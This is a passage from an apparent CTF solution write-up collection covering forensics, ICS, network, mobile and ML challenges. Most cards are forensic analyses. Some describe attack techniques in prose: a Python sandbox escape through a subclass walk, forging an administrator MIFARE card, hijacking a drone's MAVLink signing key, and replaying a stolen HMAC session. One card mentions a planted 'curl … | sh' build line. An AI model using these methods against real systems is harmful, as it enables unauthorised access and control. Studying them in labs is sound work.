6. The flight-log tag `dc6836a2`, recovered by XORing the last 12 bytes with the aircraft name, is an offline oracle for the digest's last 8 hex.

**Why it works**

Two JSON parsers disagree about the same bytes: one treats the duplicate keys as unknown, the other as overrides. The result is a single recorded command that is compliant to the client and diverted to the server.

**Validation**

The tag matches only the positive deltas with the WGS-84 equatorial radius; two other radii, the negative-delta reading and the radio log's rounded 380 m all produce different digests and were rejected offline.

### Polyglot Requiem
Forensics · Medium · Mohamed Amine Mzoughi
Points at solve: 270

**Approach**

1. The archive is a retained `flight-telemetry-sdk` git repository with two secrets in it.
2. `git fsck --unreachable` turned up a dangling commit still pointed at by `ORIG_HEAD`. It had added a `curl … | sh` line to `build.sh` and was later rewritten out of history. The URL was never contacted, but the commit's committer timestamp became the epoch used later.
3. `assets/telemetry_icon.png` is 10×10 pixels yet weighs 23 KB — a polyglot. It carries a `tEXt` chunk with a provenance value and a ZIP appended after `IEND`, holding a SQLite cache and an ELF.
4. In the SQLite cache the live `build_secrets` table has only decoy tokens, but page 2's free space still holds a deleted row with a 36-byte BLOB.
5. Disassembled the ELF statically with capstone, never running it. It reverses the hex tag bytes, appends the epoch as 8-byte little-endian, takes SHA-256 as a 32-byte key and XORs the file with it.
6. Recomputing that key against the deleted BLOB recovered the marker.

**Why it works**

Each layer hides something in a different slack space: git's unreachable objects, bytes after a PNG `IEND`, and free pages inside a SQLite file. All three are invisible to normal readers but preserved on disk.

**Validation**

The polyglot's ZIP parses with correct local headers, the deleted row's BLOB length matches the ciphertext, and the derived key decrypts to printable text. Nothing from the evidence was executed or contacted.

### Redline
Forensics · Easy · Chronos Security
Points at solve: 120

**Approach**

1. Opened the DOCX as a ZIP and read `word/document.xml` and `word/comments.xml`.
2. A tracked edit replaced the original quarantine requirement with a clause allowing stock to return to distribution. The linked comment said the editor was dropping the quarantine hold and issuing a fresh authorization.
3. Read the deleted runs of that paragraph in document order. The original authorization was split across two `w:delText` nodes.
4. Joining them recovered the flag; the `dispatch_…` value in the inserted text was the fresh authorization and served as the decoy.

**Why it works**

Tracked changes store both the deleted and inserted text in the document XML. A viewer showing "final" hides the deletion, but the `w:delText` nodes remain until the change is accepted and the file is re-saved.

**Validation**

The two runs are adjacent deletions of the same paragraph, their concatenation is a well-formed flag, and the inserted text is a structurally different `dispatch_` identifier.

### Shadow-Dispatch
Forensics · Hard · Marius Merai
Points at solve: 592

**Approach**

1. The handout is an incident export for an AWS Lambda order authorizer: CloudTrail, CloudWatch streams, function and layer zips, config history and IAM.
2. The function code is clean — `CodeSha256` is identical across all 10 published versions — so the tampering is in a Lambda layer.
3. The `auth-utils` layer ships `python/_authlog.py` and its compiled `.pyc`. In versions 4/6/8/10 the `.py` differs from v1 only by a decoy comment, but the `.pyc` is hash-based and unchecked (flags byte `01`), so CPython runs the bytecode without re-checking it against the source. The malicious versions are also visibly larger.
4. Disassembling the bytecode (`marshal` + `dis`) showed a beacon: when `order_id % 5 == 0` it reads a secret and leaks two bytes per invocation through the `correlation=` field of each log line. Those logs are forwarded by a subscription filter to a Kinesis stream in a foreign account.
5. Each token is `index(1) ‖ ct(2) ‖ crc16(2) ‖ salt(11)`, keyed by `sha256(RequestId ‖ salt)[:2]`. Reassembling the eight chunks under layer v8 recovered the order HMAC key.
6. CloudTrail has no `PutParameter`, and the signer always logged `key_version=1`, so the stolen key is the live one.

**Why it works**

Layer versions are immutable but a `.pyc` can be replaced independently of its `.py`, and an unchecked hash-based pyc is trusted at import. The exfiltration hides in a log field the platform itself replicates.

**Validation**

Every two-byte chunk passes its CRC-16/CCITT, the eight indices are unique, and the reassembled key is ASCII of the expected length.

### Signal Reconciliation
Forensics · Easy · Concept and defensive navigation-integrity scenario by Balint; fresh CSCTF26 implementation.
Points at solve: 120

**Approach**

1. Integrated the east and north velocities over the 100 ms intervals with the exact integer trapezoid rule from the SOP.
2. Subtracted the integrated positions from the GPS positions and checked every possible 10-sample window. Eighteen windows qualified.
3. The final residual was 100,000 mm east and 1,000 mm north, so the decision was `QUARANTINE_GNSS_PROFILE`.
4. Serialised the header, all 601 evidence rows and the summary as ASCII with LF endings, including after the summary.
5. Checked the serialiser against the public all-zero test vector first.
6. For the incident report, took the first 24 bytes of the SHA-256 digest and encoded them as uppercase Base32 without padding.

**Why it works**

Integrating reported velocity and comparing it with reported position exposes a spoofed or drifting GNSS profile even when each individual fix looks plausible. Integer arithmetic and a fixed serialisation make the digest reproducible across implementations.

**Validation**

The serialiser reproduces the published test vector exactly, and the residual threshold selects a definite decision rather than a borderline one.

### Silent Breaker
Forensics · Medium · Dan-Andrei Grigorescu
Points at solve: 270

**Approach**

1. The case bundle is an IEC 60870-5-104 capture, an HMI monitoring log, a roster and the report contract. The console's `/files/` endpoint lists the bundle; `/events` is the flagged-signalling feed.
2. The roster has exactly one employee with OT VPN access, in OT Field Engineering. Confirming that target unlocked the VPN window and the session id.
3. Parsed the pcap with a 6-byte APDU header followed by an ASDU header of another 6 bytes, so the body starts at `apdu[6:]`, not `apdu[7:]`.
4. The only control-direction command is a `C_SC_NA_1` (type 45) at `03:06:38.000Z`, IOA `0x28be`, SCO `0x01` (select 0, qualifier 1 = ON). The RTU's activation confirmation follows 15 ms later with the same IOA and SCO.
5. The historian log stores current for that IOA every 10 s. From `03:05:40` the stored value jumps to `211.5 A`; after two GOOD entries the run is marked `QUALITY=SUSPECT` for 16 readings while the pcap stream stays at 395.6–398.4 A — a held/replayed cache record.
6. Reported the IOA, qualifier, wire time `03:06`, frozen current `211.5` and the VPN session id.

**Why it works**

The breaker command is only anomalous in context: the historian's suspect-quality run proves the displayed current was frozen, and the packet timestamp — not the VPN session start — is the command's actual time.

**Validation**

The activation/confirmation pair matches on type, IOA and SCO, and the historian's suspect window brackets the command exactly. The four offline fields were re-derived from the preserved handout for this writeup.

### The Capability Ghost
Forensics · Easy · Mohamed Amine Mzoughi
Points at solve: 120

**Approach**

1. Verified the handout files against `manifest.sha256`, then inspected the runner filesystem tarball and journal.
2. The service and provisioning records referred to `hc-probe --seal`.
3. Read the `SCHILY.xattr.user.build_seal` PAX attribute on `usr/local/bin/hc-probe` and recovered the seal epoch from the journal.
4. Used the raw bytes of the extended attribute as the HMAC-SHA256 key and the ASCII epoch as the message.
5. XORed the resulting mask with the sealed signalling configuration to recover the flag.
6. The solver reads the stored archive metadata and leaves file capabilities untouched.

**Why it works**

PAX extended attributes are stored in the tar stream but are not visible through a normal file listing or a capability check. The seal is bound to that hidden attribute, so the integrity evidence survives exactly where nobody looks.

**Validation**

The manifest hashes match every extracted file, the PAX attribute is present on the binary and absent from the final filesystem listing, and the XOR output is printable.

### The Layer That Wouldn't Die
Forensics · Easy · Mohamed Amine Mzoughi
Points at solve: 120

**Approach**

1. Followed the OCI index to the manifest and inspected its layer tarballs in order.
2. Layer 2 introduced `etc/cascade/.sealed_marker`; layer 3 added `etc/cascade/historian.key.sealed` while that marker was in place; layer 4 replaced the marker; a whiteout in layer 5 removed it from the final view.
3. Took the original marker bytes from layer 2 and the ciphertext from layer 3.
4. Decoded the configuration label `build.seal` from hex and used it as the HMAC-SHA256 key, with the marker as raw ASCII bytes.
5. XORed the digest against the ciphertext. The blob sizes and SHA-256 digests matched the OCI descriptors, and the result was the complete flag.

**Why it works**

An OCI image is a stack of immutable layers; a whiteout only hides a path in the merged view, it does not remove the bytes from the layer that added it. The seal was computed against a version of the marker that later layers replaced.

**Validation**

Every layer digest matches its descriptor, and the recovered plaintext is coherent. The marker used is the one present at the moment the sealed file was written, not the final one.

### Tone Burst
Forensics · Easy · Chronos Security
Points at solve: 120

**Approach**

1. Read the mono 8 kHz PCM from the WAV and looked for the two tones in the burst.
2. The carrier switches between 1,000 Hz and 2,000 Hz; each symbol lasts 20 ms, which is 160 samples at this rate.
3. Started at 0.24 s and compared the energy at the two frequencies in each window.
4. Decoded 1,000 Hz as 0 and 2,000 Hz as 1, then assembled bytes most-significant bit first.
5. The stream began with the `AA AA AA AA 7E` preamble, and the ASCII flag followed the frame marker.

**Why it works**

Two well-separated frequencies give an unambiguous per-window decision even with noise, and a fixed symbol length means the bit clock can be derived from the sample rate rather than recovered from the signal.

**Validation**

The solver checks the preamble before printing anything, and the decoded bytes after the marker are printable ASCII in the flag format.

## ICS

### Operation Blackout
ICS · Hard · CSA Romania
Points at solve: 540

**Approach**

1. Five artifacts describe one Modbus incident at substation `0x4A2E`, and the card's serialiser names the fields, so each was read from the artifact the spec names rather than inferred.
2. `plc_firmware.bin` starts with `50 4C 43 31` = `0x504C4331` ("PLC1"); the readable `V3.2.1` string is a decoy for this field.
3. `hmi_config.xml` gives `<station_id>0x4A2E</station_id>`, `<ManifestSeed>137</ManifestSeed>`, and a hidden calibration routine with a function-code 16 write to 40001, count 64, payload `55 FA` repeated.
4. `scada_network.pcap` has 36 frames and 31 Modbus/TCP packets, of which exactly one is FC16 — transaction 2, unit 1, start `0x9C41` = 40001, count `0x0040`, body `55fa` × 8. It matches the HMI routine on every field.
5. `substation_log.json` records that write at `2025-11-15T06:15:03Z`, a 247-byte overflow against a 128-byte limit, three altered thresholds, a firmware integrity failure, and the outage 45 minutes later.
6. `alarm_override.dat` contains the same three threshold changes: 85→250, 200→10, 500→5000.
7. The only ambiguity is the timestamp: the pcap stamps the same write at `06:05:03Z`, the log at `06:15:03Z`. The serialiser says the log entry, so the pcap's ten-minute offset is a decoy.
8. Preimage, in the fixed order: `0x504C4331:0x4A2E:2025-11-15T06:15:03Z:40001:137`, then `sha256(...)[:8]`.

**Why it works**

Two independent sources agreeing on the function code, register, count and payload proves the write is the documented routine rather than incidental traffic; the log then supplies the authoritative time and the alarm file corroborates the effect.

**Validation**

Every field was cross-checked against a second artifact where one existed, the alternative timestamps, register encodings and version strings were tested and rejected, and the digest reproduces exactly.

## Misc

### Command Calendar Reconciliation
Misc · Easy · Chronos Security
Points at solve: 120

**Tools used:** `python-dateutil` for `RRULE` expansion.

**Approach**

1. Read `/brief` before touching the calendar: it fixed the response window, the membership rule, the strict ordering rule and the exact 24-record attestation schema; `/case.ics` supplied the source data.
2. Unfolded the iCalendar lines and split each `VEVENT` into a master (keyed by `UID`) or a detached override (keyed by `UID` plus `RECURRENCE-ID`).
3. Expanded every `RRULE` from its `DTSTART`, added `RDATE` occurrences and removed `EXDATE` occurrences, leaving nominal identities. Each override was then matched to its original identity by `RECURRENCE-ID`.
4. One July 22 occurrence was overridden to a July 6 start, so its recurrence ID stayed July 22 while its actual start became July 6. Filtering on actual `DTSTART` against the July 6–21 UTC window and sorting by `start_utc` left 24 activations.
5. Submitted the JSON to `/attest` with `application/json`; the response carried the flag in `routing_authorization`.

**Why it works**

The brief defines a deterministic function from the two published files: recurrence rules generate nominal identities, overrides replace their actual times, and the window filter runs after replacement. Ordering by the resulting `start_utc` is then unambiguous, so a server holding the same export can recompute the exact set.

**Validation**

The solver asserts 24 activations with 24 distinct start times, all categorised `EMERGENCY-RELAY`, before writing the attestation. `POST /attest` accepted the JSON. The README records the flag but no separate verification transcript.

### golem
Misc · Easy · Iulian Schifirnet
Points at solve: 120

**Approach**

1. The archive holds the GASM specification and 24 worked examples. Wrote an interpreter that parses `rep`, `ifz` and `ifn` into nested blocks and executes them with sixteen 16-bit registers and a byte input tape.
2. The details that mattered were 16-bit wraparound after every write, `div` by zero returning 65535, `mod` by zero keeping the dividend, shift counts masked with `& 15`, and an exhausted input tape returning 65535. Each conditional reads its register once at block entry.
3. Checked the interpreter against all 24 examples before connecting.
4. The service sends `PROGRAM`, the code up to a single `.`, an `INPUT` line, then an `OUTPUT>` prompt with no trailing newline — so the client waits for the `OUTPUT>` bytes instead of reading a full line.
5. Sent the resulting numbers space-separated, or an empty line when there is no output. All 100 rounds returned `OK`.

**Why it works**

The service is a deterministic interpreter with no randomness, so a correct implementation of the published semantics reproduces the expected output for any program. The specification's edge cases are the whole challenge — a conventional interpreter would diverge on the first division by zero.

**Validation**

The 24 worked examples pass offline before any network use, and the live run completed all 100 rounds without a single mismatch.

### lattice
Misc · Easy · Iulian Schifirnet
Points at solve: 120

**Approach**

1. The handout is one `lattice.py`: an 8-byte-block, 16-round ECB toy cipher with `TARGET = encrypt(SECRET)` and, deliberately, no decrypt routine. The service wants the plaintext secret.
2. Every round is invertible and fully specified: even rounds add the round key mod 256, odd rounds XOR it; each byte goes through a key-dependent S-box built by Fisher–Yates over a custom LCG; the eight bytes are packed big-endian and rotated left by `(7*r + 11) % 63 + 1`.
3. Ran the rounds from 15 down to 0, undoing each step in reverse order: rotate right by the same amount, map bytes through the inverted S-box, then subtract (even) or XOR (odd) the round key.
4. Imported `SBOX`, `RKEYS`, `TARGET` and `_rot_amount` straight from the handout so the tables always match, and confirmed the result by re-encrypting it and checking equality with `TARGET`.
5. Sent the recovered preimage to the service to obtain the flag.

**Why it works**

A block cipher is only as strong as its key schedule, and here the round keys are given. Every operation is a bijection on 8 bytes, so the encryption is a permutation that can be walked backwards step by step.

**Validation**

Re-encrypting the recovered plaintext reproduces `TARGET` exactly, which is a complete correctness proof for the inverse. The preimage is omitted here because it is the challenge answer.

### Operation Dawn: The Cipher Lock
Misc · Hard · Terminal43
Points at solve: 540

**Tools used:** NumPy.

**Approach**

1. `traces.npz` holds 1,500 power traces of 87 samples, the 1,500 candidate 47-byte codes that were fed in, and the standard AES S-box.
2. Forty-seven of the 87 sample positions have a mean near 4 — the mean Hamming weight of a leaking byte — and the rest are noise. The 47 leaking positions are shuffled, so position does not reveal byte order.
3. For each of the 47 code bytes, ran CPA: for every key guess `k` in 0–255, model the leakage as `HW(sbox[p ^ k])` and take the Pearson correlation against every trace sample.
4. The correct byte stands out at correlation ≈ 0.30–0.37, roughly 2–3× the runner-up, and each byte leaks into its own sample.
5. Concatenating the 47 best guesses gave a readable 47-byte code, which is the flag body.

**Why it works**

The traces leak Hamming weight of the S-box output, which depends on the plaintext byte and the key byte together. Correlating a modelled leakage against many traces isolates the one key guess whose model tracks the data; noise averages out as the trace count grows, and 1,500 traces is ample for a single-byte hypothesis.

**Validation**

Every byte's winning correlation is separated from the runner-up by a factor of two or more, and the concatenated result is printable text in the expected format rather than random bytes.

### Operation Dawn: The Fire-Control Terminal
Misc · Easy · Terminal43
Points at solve: 120

**Tools used:** the `python-dateutil` calendar solver shared with Command Calendar Reconciliation.

**Approach**

1. Opened the Fire-Control Terminal target and found a `relaycal` service exposing `/brief` and `/case.ics`.
2. Downloaded both files and compared them with the Command Calendar Reconciliation handout: they matched byte for byte, so the same solver reproduced the attestation instead of a second implementation.
3. Expanded the three recurring series, applied the `RDATE` and `EXDATE` lists, and matched detached instances by `RECURRENCE-ID`.
4. Filtering on the resulting `DTSTART` inside the July 6–21 UTC window moved the July 22 occurrence in and the July 20 occurrence out, leaving 24 activations.
5. Sorted them by `start_utc` and posted the JSON to `/attest`; the service returned HTTP 200 and placed the flag in `routing_authorization`.

**Why it works**

The terminal is a second front end over the same `relaycal` calendar contract, not a different puzzle. Because both published inputs are byte-identical, the attestation is the same deterministic object, and the membership and ordering rules are enforced by the same hidden recomputation.

**Validation**

Both downloaded files match the companion challenge's handout, and the rebuilt attestation was accepted with HTTP 200. The README gives no independent transcript beyond the response field, so this card's evidence is the file identity plus the accepted submission.

### Operation Dawn: The Reconnaissance Plate
Misc · Easy · Created by Terminal43 (Operation Dawn)
Points at solve: 120

**Tools used:** NumPy and Pillow.

**Approach**

1. Read the PNG pixels in RGB order and packed the bits from each low bit plane most-significant bit first.
2. The least significant bit held a gzip archive with a `DRILL` annotation.
3. The second-least significant bit held another gzip archive starting four bytes into the packed stream — the first is the decoy.
4. Opened `plate/annotation.txt` in the second archive and read the actual recon serial `11`, the phrase `THE GUNS BEHIND THE RIDGE` and the check group `3F8C21`.
5. Lowercased the phrase and check group, then joined serial, words and check group with underscores.

**Why it works**

Each bit plane is an independent binary image. Packing one plane in raster order turns it into a byte stream, and gzip's magic number and CRC make the correct plane and offset self-identifying — a wrong plane fails to inflate.

**Validation**

Both extracted archives inflate with valid CRCs; the second one's annotation cross-references the serial and check group independently, and the assembled string matches the expected format.

### Operation Dawn: The Shared Model
Misc · Easy · Terminal43
Points at solve: 120

**Approach**

1. Loaded the NPZ arrays with pickle disabled.
2. The first dense layer's weight gradient for an individual sample equals the corresponding bias gradient times the input. Dividing each row of `update_W1` by its nonzero `update_b1` value therefore recovers that input.
3. All 34 nonzero rows returned the same vector, which is the consistency check that the identity had been applied correctly.
4. The values became integer ASCII codes after multiplication by 255.
5. Ran the recovered vector through both layers of the supplied model and compared the output with the saved logits.

**Why it works**

For a single-sample batch, `dW = dY · xᵀ` and `db = dY`, so the ratio `dW/db` is exactly the input regardless of the upstream gradient. Sharing one update across rows is what makes the reconstruction overdetermined.

**Validation**

Thirty-four independent rows agree on the same input, the vector decodes to printable ASCII, and a forward pass through the supplied model reproduces the stored logits.

### Operation Dawn: Watch List Audit
Misc · Easy · Terminal43
Points at solve: 120

**Approach**

1. Fit an affine model to the most recent observations in `history.csv` and walked backward until a row stopped matching. The change fell at zero-based index 209.
2. Separate models fit rows 0–208 and 209–499 with residuals near floating-point precision, confirming a single regime change rather than drift.
3. Refit the latest model on all 291 rows after the change and scored the 32 probes in file order.
4. Computed `floor(1000 * score + 0.5)` for each value and wrote each decimal integer followed by an ASCII LF, including the last.
5. Took the SHA-256 of those bytes.

**Why it works**

The series is piecewise affine with one injected step, so walking a fitted model backwards finds the exact boundary where the old parameters stop explaining the data. Rounding to three decimals before hashing removes floating-point representation noise, which is the usual cause of a mismatched digest.

**Validation**

Both segments fit to near machine precision, the boundary is a single clean index, and the explicit `floor(x + 0.5)` rule plus trailing LF matches the specification's serialisation.

### Telltale
Misc · Easy · Chronos Security
Points at solve: 120

**Approach**

1. Inspected the 48 kHz mono PCM and found two amplitude levels.
2. The frame starts at sample 12,000. Averaged blocks of 24 samples and used 12,729 as the threshold.
3. Each pair of blocks encodes a Manchester bit: low-to-high is 1, high-to-low is 0.
4. Packed the bits most-significant first. Eight `AA` bytes formed the preamble, followed by the `7E` marker, a `30` length byte and 48 bytes of ASCII.
5. Computed CRC-8 with polynomial `0x07` and initial value `0x00` over the length byte and payload; it matched the final frame byte.

**Why it works**

Manchester coding puts a transition in every bit cell, so the clock is recoverable from the signal itself and polarity is unambiguous. Averaging fixed blocks suppresses sample noise, and the preamble plus CRC make the frame boundary and payload verifiable.

**Validation**

The preamble is exact, the length byte matches the 48 payload bytes actually decoded, and the CRC-8 check byte agrees.

### ultralight
Misc · Medium · Sam
Points at solve: 275

**Tools used:** `cryptography` for 3DES-CBC and `zlib` for CRC-32.

**Approach**

1. The handout is two 192-byte MIFARE Ultralight C dumps; diffing them separates common tag structure from per-card data.
2. Decrypted bytes 24–159 of a dump with 3DES-CBC, using the published Ultralight C default key and the eight-byte IV stored at offset 16, giving the name, user-type, timestamp and checksum fields.
3. Kept the informer card's eight-byte timestamp and changed `user_type` to `0x03`, the administrator value. Supplied a fresh seven-byte UID and the name `overseer`, padded to 20 bytes.
4. Rebuilt the decrypted record: length byte at offset 10, name at 12–31, timestamp at 32–39, CRC-32 over `UID || timestamp || user_type` big-endian at 40–43.
5. Recomputed both UID check bytes (`BCC0 = 0x88 ^ UID[0..2]`, `BCC1 = UID[3..6]`), re-encrypted with the same key and IV, and reassembled the card from the UID header, bytes 9–24, ciphertext and trailer.
6. Uploaded the 192-byte image to `/api/validate`; it was accepted as an administrator card.

**Why it works**

Ultralight C data pages are encrypted under a card-family default key, and the validator trusts the record's own CRC and BCC bytes rather than a per-card secret. Reproducing the ciphertext and checksums is enough to rewrite `user_type`.

**Validation**

The solver reproduces the accepted image deterministically from `card_sam.bin`, the chosen UID and name; `/api/validate` accepted it and returned the access code. The README does not include an independent server-side image to compare against.

### warden
Misc · Medium · Iulian Schifirnet
Points at solve: 282

**Approach**

1. `jail.py` reads one line (4096 bytes max), rejects newlines and import statements, compiles it before sealing, then installs an audit hook and executes with an empty builtins dict: `exec(code, {"__builtins__": {}})`.
2. The hook allows exactly two events — `object.__getattr__` and the jail's own single `exec` — and kills the interpreter on anything else: `open`, `import`, `subprocess`, `compile`, a second `exec`, a `ctypes` dlopen.
3. The blind spot is that environment access is not audited, and neither is `os.write`. Attribute reads are explicitly allowed, so the only problem is reaching a module object without importing one.
4. `object.__subclasses__()` lists every loaded class. `_wrap_close` is the class of the file objects behind `sys.stdout`; its `__init__.__globals__` is the `subprocess` module globals, which contain `sys`, and `sys.modules['os']` is a direct reference.
5. Sent one line that walks to `_wrap_close`, takes `os` from its globals, and writes `repr(os.environ)` to fd 1.

**Why it works**

Python's audit hooks cover file, process and import operations but not reading the environment or writing to an already-open descriptor. The subclass walk needs no builtins, and the whole escape uses only attribute access, which the hook permits.

**Validation**

The single line printed the environment including the flag, and no `[warden] I heard that:` line appeared — the hook never fired.

## ML

### Operation Dawn: The Sentry's Model
ML · Hard · Terminal43
Points at solve: 540

**Tools used:** NumPy.

**Approach**

1. `authenticator.npz` is a tiny fully connected network, `392 → 48 (ReLU) → 1`. The 392 inputs are 49 characters × 8 bits, so it scores a candidate pass-string.
2. Loaded `W1` (48×392) and looked at the neurons. Two stand out: #22 and #23 have biases of −205 and −208 while every other neuron sits near 0.1, and their output weights are 16 and 26 against less than 0.5 elsewhere.
3. Their input weights are all exactly ±1 — a bit-mask of a string. Reading +1 as 1 and −1 as 0 gives two flag-shaped strings.
4. Neuron #22's mask has 207 ones against a bias of −205, so its pre-activation on its own string is `207 − 205 = +2 > 0`: it fires, the model score jumps from about 4.4 to 43, and the forgery is accepted.
5. Neuron #23 has only 203 ones against bias −208, so `203 − 208 < 0`: on any binary input it can never fire. Its string is the decoy.

**Why it works**

A backdoor planted in a ReLU network is a neuron whose bias is tuned to the Hamming weight of one exact input, so it activates only for that string. The arithmetic of `ones + bias` decides which of the two candidates can ever fire — a fact the weights answer without running the model.

**Validation**

Forward passes confirm the live neuron's score jump and the dead neuron's inability to activate; the accepted string is the one whose pre-activation is positive.

## Mobile

### VaultKeeper
Mobile · Easy · Pratik Shetty
Points at solve: 120

**Tools used:** `cryptography` for AES-GCM.

**Approach**

1. Checked the APK's SHA-256 against the briefing and followed the recovery flow in `classes.dex`.
2. `RecoveryDiagnosticsActivity` checks the URI `vault://recover?stage=1` and compares the supplied recovery token with the result from `VaultDiagnosticsProvider`. The provider derives the token from the first eight uppercase hex characters of the signing certificate's SHA-256, wrapped in a fixed prefix/suffix. Reading the certificate reproduces it.
3. `RecoveryStage2Receiver` expects the broadcast extra `archive_key` to equal a fixed eight-hex value taken from the manifest.
4. The archive screen takes four digits, computes HMAC-SHA256 with a session string as key, and displays the first eight hex characters. Brute-forcing all 10,000 four-digit values found exactly one match.
5. The unlock handler hashes the concatenation of recovery token, archive digits and master passcode with SHA-256.
6. It Base64-decodes the embedded resource, uses its first 12 bytes as the nonce, and decrypts the rest with AES-GCM. The tag verified and the plaintext was the flag.

**Why it works**

Every check is client-side: the certificate hash and the four-digit code are both derivable from the APK itself, and the real secret is only protected by a key derived from values the app already contains. The intent URI and broadcast are just delivery mechanisms for those values.

**Validation**

The GCM authentication tag verified, the decrypted plaintext is well-formed, and the recovered four-digit code is the unique match among 10,000.

## Network

### Dark Anchorage Reconciliation
Network · Medium · Chronos Security
Points at solve: 270

**Approach**

1. Read the schema, the AIS and radar exports, and the cable fault location and method note from the assigned instance.
2. The radar export used a clock 120 minutes ahead of UTC. After subtracting the offset, both series aligned from 10:00 UTC at 120-second intervals.
3. Compared the median local-plane distance for every radar-track and AIS-vessel pair. Each of the 16 tracks had exactly one candidate at a median distance of zero, with all alternatives above 230 m.
4. Track `R-13` matched one MMSI. Four AIS samples between 11:22 and 11:28 UTC were shifted 390 m east and 330 m north relative to the radar track.
5. The radar track crossed the cable fault itself; closest approach was 0.0 m at 11:31:38 UTC, inside the 11:18–11:32 fault window.
6. Submitted the report to `POST /reconcile` with separate `ais_minus_radar_east_m`, `ais_minus_radar_north_m`, `start_utc` and `end_utc` fields.

**Why it works**

A spoofed AIS track cannot match radar geometry. Pairing by closest median distance turns 16 vessels into 16 one-to-one assignments, and the residual vector then quantifies exactly how the AIS position was displaced — including the sign, which the separate east/north fields require.

**Validation**

Every track had a single zero-distance candidate and all alternatives were hundreds of metres away, so the pairing is not ambiguous. The displacement is consistent across four consecutive samples, and the closest-approach time falls inside the published fault window.

### Ghost Signal
Network · Hard · CSA Romania
Points at solve: 540

**Approach**

1. Catalogued what each handout records. The SS7 capture has 60 frames of Ethernet/IPv4/SCTP/M3UA/SCCP/TCAP-MAP; the Diameter capture has 28 SCTP frames; the billing export has 40 OCS records.
2. In the SS7 capture, frames 1–45 are cover traffic with a fresh calling GT per frame. The attacker is the only calling GT that repeats.
3. GT 49211 runs five `sendRoutingInfo` and five `sendRoutingInfoForSM` probes against five consecutive numbers, sharing one OPC block — one box.
4. GT 49311 then sends five `updateLocation` messages for a single IMSI, the only valid 15-digit IMSI in the data set.
5. In the Diameter capture, packet 25 is a rogue SAR from a foreign realm on the same session, and packet 26 is an SAA whose AVP 272 carries a redirect URI to the attacker's host.
6. The billing export books five zero-charge CCR-I and five unusual-routing CCA on that IMSI and session; the CCA rows are back-dated by 20 seconds, which initially makes them look corroborated by the wrong SS7 stage.
7. The marker is `sha256("<imsi>:<full_session_id>:<first_anomalous_billing_timestamp>")[:8]`, using the session string as written and the billing record as written.

**Why it works**

The IMSI is the only identifier present in all three sources, so it is the join key. Once the four stages are ordered, the billing timestamps line up with the SS7 stages to the second — but only after the 20-second back-dating is noticed.

**Validation**

Each input is corroborated in at least two handouts, and the corrected billing timeline matches the SS7 message times exactly.

### grid-watch
Network · Hard · Marius Merai
Points at solve: 540

**Tools used:** `pymavlink`; exact rational least squares for the clock fit.

**Approach**

1. The handouts are a 24-frame signed MAVLink 2 capture and a note describing the signing subsystem, treated as a specification.
2. The serial comes from the capture's status text.
3. RTC calibration is the puzzle: signing timestamps are 10 µs ticks since a per-unit commissioning epoch with ppm drift, and the epoch is an HKDF input. Regressing timestamps against wall clock gave 100001.699902 ticks/s (+16.9990 ppm) and epoch 1733965123, maximum residual 0.527 ticks.
4. Epoch 1733965123 with ppm +17 reproduces all 24 timestamps exactly; epoch ±1 s or ppm ±0.1 fails all 24.
5. `prov_key = HKDF-SHA256(serial || u64le(epoch), salt = hex(nonce), info = "CX-PROV/v1", L = 32)`. The ASCII-salt variant was tested and rejected on a separate connection.
6. A `SETUP_SIGNING` signed with that key installs our session key; then guided mode, arm, reposition.

**Why it works**

Signing is only as strong as its provisioning path. The key is fully determined by broadcast values plus a clock model recoverable from the capture, so it can be replaced rather than forged.

**Validation**

The model matches all 24 timestamps while every neighbouring parameter fails all 24, and it tracked the live unit within the measured round trip. `DO_SET_MODE` and `DO_REPOSITION` must be sent as `COMMAND_LONG`; timestamps must exceed the `SETUP_SIGNING` initial value.
### Hard Landing
Network · Easy · Teodor Giurgica
Points at solve: 120

**Approach**

1. `console.pcapng` has seven plaintext HTTP request/response pairs on port 8080: two logins and five commands.
2. Three commands come from a third host that reuses the administrator's `X-Session` without logging in — the session was lifted off the wire.
3. Both login responses are `Content-Encoding: gzip`; tshark returns the raw deflate payload, so it has to be decompressed before parsing. That yields the session id and a 32-byte HMAC key per role.
4. Recovered the scheme from `GET /api/status`: `POST\n/api/command\n<X-Timestamp>\n<BODY>`, HMAC-SHA256, freshness 300 s.
5. Confirmed the key is genuine by recomputing both the operator signature and the rogue administrator request from the capture — both match.
6. Read `server_time` from the console, used it as `X-Timestamp`, and sent `{"cmd":"RETURN_TO_PAD","pad":"A1"}` with the admin session and a recomputed signature.

**Why it works**

The session and key travel in a compressed response body, so anyone with the capture can reconstruct them. The canonical string is published by the service, which removes the guesswork; only freshness forces a live timestamp.

**Validation**

Controls behaved as documented: an all-zero signature, a 1000-second-old timestamp, a correctly signed but non-permitted pad, and a replayed rogue signature all returned 403.

### Operation Silent Ward
Network · Hard · CSA Romania
Points at solve: 821

**Approach**

1. The handouts describe one incident at a MedScan site: device XML, patient records, a pcap, an SNMP trap log and an XOR-encrypted exfil stream.
2. The published serialiser is exact: `sha256("<dicom_serial>:<snmp_iso_timestamp>:<leak_count>:<anomaly_count>:<manifest_seed>")[:8]`.
3. Serial: the device serial string, not the AETITLE. Leak count: 90, the CSV data rows with `status=Leaked` — counting the header gives 91 and is the off-by-one trap. Anomaly count: 20 C-STORE operations in the pcap, all to the external "backup" host; the 50 C-ECHO requests are normal health checks. Seed: stated twice and consistently in the XML and the boot trap.
4. The timestamp is the puzzle. The log tags eight lines `[ANOMALY]`, but the spec says *the* anomalous event (singular), and the event that explains the incident is the first second of the log: four monitored devices drop link simultaneously and the ward goes silent for the fifteen days the records leak.
5. The eight ANOMALY lines are attacker reconnaissance, but nothing distinguishes one from another, so any choice is a guess. The boot report one second later is a lifecycle event, not the anomaly.

**Why it works**

Four fields are plain reads; the fifth is a reading-comprehension test. The correct timestamp is the one that explains the whole incident — the moment monitoring went blind — rather than the attacker's repeated polling.

**Validation**

Every alternative reading was hashed with the same serialiser and rejected: the eight ANOMALY instants, the boot report, the AETITLE instead of the serial, 20 or 91 for the leak count, and swapped field order.
### Radar Silence
Network · Easy · Chronos Security
Points at solve: 120

**Approach**

1. Filtered the DNS queries from the radar host in `radar-silence.pcapng`.
2. Four requests to the telemetry domain carried a fragment and a two-digit index in the leading labels.
3. Frames 5, 9, 15 and 21 arrived in a different order than the fragment indices, so capture order is not assembly order.
4. Sorted the fragments by indices 00–03, concatenated them, and decoded the combined Base32 string.
5. The result was the rotation token; combined with the radar's rotation prefix it formed the flag.

**Why it works**

DNS labels are an outbound channel that survives most egress filtering, and splitting a token across four queries keeps each one under scrutiny thresholds. The index labels make reassembly order explicit, which is what defeats the capture-order trap.

**Validation**

